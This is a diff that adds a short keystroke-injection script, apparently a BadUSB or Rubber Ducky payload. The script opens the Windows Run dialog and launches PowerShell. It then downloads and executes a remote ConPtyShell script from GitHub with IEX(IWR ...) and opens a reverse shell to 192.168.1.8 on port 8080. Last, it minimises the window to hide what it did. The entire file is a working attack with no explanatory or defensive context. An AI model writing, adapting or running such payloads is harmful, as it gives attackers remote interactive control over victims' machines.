@@ -1,0 +1,11 @@
+DELAY 1000
+GUI r
+DELAY 500
+DELETE
+STRING powershell
+ENTER
+DELAY 1000
+STRING IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.8 8080
+ENTER
+DELAY 1000
+GUI DOWN
